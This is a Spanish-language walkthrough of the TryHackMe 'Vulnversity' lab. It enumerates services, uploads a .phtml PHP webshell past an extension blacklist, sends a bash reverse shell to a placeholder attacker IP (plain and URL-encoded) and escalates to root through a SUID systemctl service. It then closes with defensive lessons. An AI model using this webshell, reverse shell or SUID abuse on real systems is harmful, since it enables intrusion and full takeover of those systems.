---
title: "Vulnversity"
date: 2026-09-25
categories: [TryHackMe, Easy]
tags: [linux, ftp, samba, squid-proxy, apache, gobuster, directory enumeration, file upload, php, phtml, extension filter bypass, content-type bypass, webshell, reverse shell, burp suite, directory listing, SUID, systemctl, gtfobins, privilege escalation]
image:
  path: /assets/img/THM/Vulnversity/banner.webp
  lqip: "data:image/webp;base64,UklGRhgBAABXRUJQVlA4WAoAAAAQAAAAHwAAFwAAQUxQSA4AAAABENoQ/x9tsipFRJLdG1ZQOCDkAAAA0AUAnQEqIAAYAD7taqxQqaWkIqgKqTAdiWQAtRskwASQXYAApMhhxXwItMvBX/CHSECzLbBvfAD+6+MExKraB1Mwcf925S7jhg33TTQmvW2H5P3PtuN6JUyT2fXFXbK2tWblpBLoAdL8AG0WNSLpW3VZIECPXSn0eSVhU9BTy8AZgFSyyvr+CT0l0SeDNIROzBT22bao/s6u3F2OVjn0PLhwu9u8vwdbpRCpjIR4f3cb5jIfaj3d4eMmo8SZ+VoR9MRwxe0Rlf4g9J9uRGjtRHIqMMvuhyNIXDc4nRIG5M3QAAAA"
  alt: Vulnversity writeup
---

Vulnversity es una máquina Linux Easy de TryHackMe construida en torno a un fallo web muy común llevado de principio a fin: un formulario de subida que comprueba la extensión del fichero, pero lo hace con una lista negra que nunca terminó de escribir. Colar un webshell PHP como fichero `.phtml` da ejecución de comandos como `www-data`, y desde ahí un binario `systemctl` con el bit SUID —abusado directamente desde GTFOBins— convierte un servicio de un solo uso en una shell de root.

Una nota de mantenimiento antes del recorrido: la VM objetivo se reinició a mitad, así que su dirección cambió de `10.130.152.112` durante la enumeración a `10.130.173.255` en la fase de escalada. Es la misma máquina todo el rato; cada comando simplemente usa la dirección que estuviera activa en ese momento.

| Campo      | Detalles   |
|------------|------------|
| Plataforma | TryHackMe  |
| Dificultad | Easy       |
| SO         | Linux      |
| IP         | 10.130.152.112 |
| Fecha      | Septiembre 2026 |

## Herramientas Usadas

| Herramienta  | Descripción                                                                     |
|--------------|---------------------------------------------------------------------------------|
| nmap         | Escáner de puertos y fingerprinting de servicios (TCP y top-100 UDP)            |
| gobuster     | Fuerza bruta de directorios usada para mapear la web y encontrar `/internal/`   |
| curl         | Peticiones HTTP manuales — fingerprinting del SO y manejo del webshell          |
| Burp Suite   | Proxy de interceptación (vía FoxyProxy) para reenviar y manipular la subida     |
| netcat (nc)  | Listener que recibió la reverse shell                                           |
| find         | Enumeración de SUID en el objetivo (`find / -perm -4000`)                       |
| systemctl    | Binario SUID-root abusado para ejecutar un servicio propio como root            |

## Reconocimiento y Enumeración

### Escaneo de Puertos

Primero un barrido TCP SYN completo, rápido gracias a una tasa mínima de paquetes alta, y luego un escaneo dirigido de servicio/versión solo sobre los puertos que respondieron:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 10.130.152.112 -oG allPorts
```

```bash
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
22/tcp   open  ssh          syn-ack ttl 62
139/tcp  open  netbios-ssn  syn-ack ttl 62
445/tcp  open  microsoft-ds syn-ack ttl 62
3128/tcp open  squid-http   syn-ack ttl 62
3333/tcp open  dec-notes    syn-ack ttl 62
```

```bash
sudo nmap -p21,22,139,445,3128,3333 -sCV 10.130.152.112 -oN nmap
```

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Seis servicios, pero la forma de la máquina ya se intuye. FTP (vsftpd 3.0.5) y SSH son versiones actuales sin una vía de entrada evidente. Samba en 139/445 y un proxy Squid en 3128 se anotan pero son secundarios. El que destaca —y el único que realmente sirve un sitio— es **Apache en el 3333**, cuyo título, *Vuln University*, prácticamente anuncia dónde está el camino previsto.

Un escaneo UDP rápido de los top-100 solo devolvió el habitual servicio de nombres NetBIOS, nada sobre lo que pivotar:

```bash
sudo nmap --top-ports 100 -sCV -Pn -sU 10.130.152.112 -oN udpNmap
```

```bash
PORT    STATE         SERVICE     VERSION
68/udp  open|filtered dhcpc
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
```

### Aplicación Web — Vuln University en el 3333

El sitio del puerto 3333 es una plantilla universitaria estática, sin nada interactivo a la vista, así que el siguiente paso es buscar lo que no está enlazado:

![Página principal de Vuln University servida por Apache en el puerto 3333, una landing estática con temática universitaria](/assets/img/THM/Vulnversity/cap1.png)

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.130.152.112:3333/
```

```bash
images               (Status: 301) [Size: 324] [--> http://10.130.152.112:3333/images/]
css                  (Status: 301) [Size: 321] [--> http://10.130.152.112:3333/css/]
js                   (Status: 301) [Size: 320] [--> http://10.130.152.112:3333/js/]
fonts                (Status: 301) [Size: 323] [--> http://10.130.152.112:3333/fonts/]
internal             (Status: 301) [Size: 326] [--> http://10.130.152.112:3333/internal/]
```

Las carpetas de recursos estáticos (`images`, `css`, `js`, `fonts`) son las esperadas; **`internal`** no lo es. Antes de abrirla, una comprobación barata resuelve si esto es Linux o Windows —útil para adivinar rutas del sistema más adelante—. Un servidor web en Linux trata las rutas de URL de forma sensible a mayúsculas; en Windows no:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://10.130.152.112:3333/images/   # 200
curl -s -o /dev/null -w "%{http_code}\n" http://10.130.152.112:3333/iMages/   # 404
```

Cambiar una sola letra a mayúscula convierte un `200` en un `404`, así que el servidor distingue `images` de `iMages` —sensible a mayúsculas y, por tanto, **Linux**—. En Windows ambas peticiones habrían devuelto la misma página.

### El Formulario de Subida en `/internal`

`/internal/` es un simple formulario de subida de ficheros — justo el tipo de funcionalidad que es fácil implementar mal:

![La página /internal de Vuln University, un formulario mínimo de subida con un botón para elegir fichero y otro para subirlo](/assets/img/THM/Vulnversity/cap2.png)

## Explotación — Subida de Ficheros Sin Restricción

### Interceptando la Subida con Burp

Para manipular la petición en vez del formulario del navegador, apunto el proxy del navegador a Burp Suite (uso el add-on FoxyProxy para el interruptor), subo un inofensivo `test.txt` y mando el `POST` interceptado al Repeater:

![Burp Suite Repeater mostrando el POST multipart a /internal/index.php; el servidor rechaza el fichero .txt](/assets/img/THM/Vulnversity/cap3.png)

Dos cosas resaltan en el Repeater. Primera, el formulario envía a **`index.php`**, así que la aplicación corre PHP —lo que significa que un fichero PHP que caiga en un directorio servido por la web *se ejecutará*, no solo se quedará ahí—. Segunda, un `.txt` normal es rechazado, así que hay un filtro sobre la extensión; el trabajo es encontrar una extensión que se le olvidara bloquear y que Apache siga entregando al motor de PHP.

Enumerando dentro de `/internal/` —esta vez pidiéndole a gobuster que pruebe también la extensión `php`— revela adónde van las subidas:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.130.152.112:3333/internal/ -x php
```

```bash
index.php            (Status: 200) [Size: 525]
uploads              (Status: 301) [Size: 334] [--> http://10.130.152.112:3333/internal/uploads/]
css                  (Status: 301) [Size: 330] [--> http://10.130.152.112:3333/internal/css/]
```

El directorio `uploads/` tiene el **listado de directorios habilitado**, así que lo que se acepte será visible —y accesible— en una URL predecible:

![El directorio /internal/uploads/ con el listado habilitado, exponiendo los ficheros subidos previamente](/assets/img/THM/Vulnversity/cap4.png)

### Saltando el Filtro con `.phtml`

El bypass clásico para una lista negra de subida PHP es `.phtml` —una extensión PHP heredada que la configuración por defecto de `mod_php` en Apache sigue ejecutando, pero que las comprobaciones ingenuas de extensión suelen olvidar incluir—. De vuelta en el Repeater, renombro el fichero a `test.phtml` y fijo el `Content-Type` de su parte a `application/x-httpd-php` para que se lea como un documento PHP:

![Burp Suite Repeater subiendo test.phtml con Content-Type application/x-httpd-php; el servidor ahora acepta el fichero](/assets/img/THM/Vulnversity/cap5.png)

Esta vez la subida es aceptada, y el fichero aparece en el listado:

![El directorio uploads mostrando ahora test.phtml, confirmando que el fichero .phtml se escribió en la web](/assets/img/THM/Vulnversity/cap6.png)

### Webshell → Reverse Shell

Con la ejecución confirmada, el payload de `test.phtml` es un webshell de comandos de una línea:

```php
<?php system($_GET['cmd']); ?>
```

Pedirlo con un parámetro `cmd` ejecuta comandos como el usuario de la web:

```bash
curl http://10.130.152.112:3333/internal/uploads/test.phtml?cmd=whoami
```

```bash
www-data
```

Un webshell por `curl` es incómodo para trabajar, así que subo a una reverse shell propia con el clásico oneliner de bash. Pasar metacaracteres de shell por una URL falla de forma fiable, así que URL-encodeo el payload primero —el Decoder de Burp es lo más rápido para ello—:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![Burp Suite Decoder URL-encodeando el oneliner de reverse shell de bash a una cadena percent-encoded](/assets/img/THM/Vulnversity/cap7.png)

Con un listener esperando, lanzo el payload codificado a través del parámetro `cmd`:

```bash
curl http://10.130.152.112:3333/internal/uploads/test.phtml?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%3c%41%54%54%41%43%4b%45%52%5f%49%50%3e%2f%34%34%34%34%20%30%3e%26%31%27
```

```bash
nc -nlvp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.130.152.112 53664
bash: cannot set terminal process group (1105): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-130-152-112:/var/www/html/internal/uploads$
```

Lo primero en cualquier shell cruda es hacer el tratamiento de la TTY —lanzar una bash de verdad con el módulo pty de `python3` y luego mandarla a segundo plano para ajustar `stty`— para que el control de trabajos, las flechas y los prompts de `sudo` se comporten con normalidad.

La flag de usuario está en el home de `bill`, legible por todos:

```bash
www-data@ip-10-130-152-112:/home/bill$ ls -la
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
www-data@ip-10-130-152-112:/home/bill$ cat user.txt
REDACTED
```

## Escalada de Privilegios — `www-data` → `root`

### Enumeración de SUID

Las tres cuentas reales de la máquina (`root`, `bill`, `ubuntu`) están en `/etc/passwd`, pero ninguna es la vía de subida. El hallazgo interesante viene de listar todos los binarios SUID —ficheros que corren con los privilegios de su propietario sin importar quién los lance—:

```bash
www-data@ip-10-130-173-255:/$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
...
/bin/su
/bin/mount
/bin/systemctl
/bin/fusermount
```

Casi toda esa lista es el conjunto estándar de binarios SUID que trae Ubuntu. **`/bin/systemctl`** no es uno de ellos —un controlador del sistema de init con el bit SUID puesto es una mala configuración, y muy conocida—.

### Abusando de SUID `systemctl` (GTFOBins)

`systemctl` con SUID significa que puedo registrar y arrancar un servicio, y systemd ejecutará el `ExecStart` de ese servicio como **root**. Siguiendo la receta de GTFOBins, escribo un servicio de un solo uso cuyo único trabajo es hacer SUID-root al propio `/bin/bash`:

```bash
www-data@ip-10-130-173-255:/tmp$ cat tmp-file.service
[Service]
Type=oneshot
ExecStart=chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
```

```bash
www-data@ip-10-130-173-255:/tmp$ systemctl link /tmp/tmp-file.service
Created symlink /etc/systemd/system/tmp-file.service -> /tmp/tmp-file.service.
www-data@ip-10-130-173-255:/tmp$ systemctl start tmp-file.service
```

En lugar de que el servicio lance una reverse shell (lo que ata el éxito al timing y a la red), poner el bit SUID en `bash` es la opción más fiable: deja un camino a root persistente y bajo demanda que sobrevive a que el servicio termine.

### Root

Con `/bin/bash` ahora propiedad de root y SUID, `bash -p` mantiene ese UID efectivo en vez de soltarlo, y la máquina está resuelta:

```bash
www-data@ip-10-130-173-255:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
www-data@ip-10-130-173-255:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
REDACTED
```

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Conclusiones Clave

- **Una lista negra de extensiones solo es tan completa como paciente sea el atacante.** El filtro aquí bloqueaba `.php` pero no `.phtml`, un alias heredado que Apache sigue ejecutando encantado. Poner en lista blanca las pocas extensiones que *quieres* es seguro; intentar enumerar todas las peligrosas que *no* quieres es un juego que acabas perdiendo.
- **La validación de subidas tiene que comprobar el fichero, no la petición.** La cabecera `Content-Type` la fija el cliente y aquí se confiaba en ella — falsearla a `application/x-httpd-php` fue la mitad del bypass. Lo que de verdad aguanta es la detección de tipo en el servidor (magic bytes) y re-codificar las subidas.
- **El listado de directorios convierte una subida a ciegas en una fiable.** Poder navegar `/internal/uploads/` significó no adivinar dónde caía el payload — la primitiva de escritura y la lectura de vuelta venían juntas.
- **La sensibilidad a mayúsculas identifica el SO gratis.** Un `curl` extra con una mayúscula confirmó Linux antes de probar un solo exploit, justo el tipo de señal barata que ahorra tiempo adivinando rutas después.
- **Un bit SUID en el binario equivocado es el fin de la partida.** `systemctl` corriendo como root significa servicios arbitrarios como root; lo seguro por defecto es que nada fuera del conjunto estándar debería llevar SUID, y cualquiera que lo lleve merece sospecha inmediata.
- **Prefiere una primitiva persistente a un payload de un solo uso.** Poner SUID en `bash` en vez de disparar una reverse shell desde el servicio hizo la escalada repetible e independiente de la red — una pequeña decisión que hace el acceso mucho más robusto.
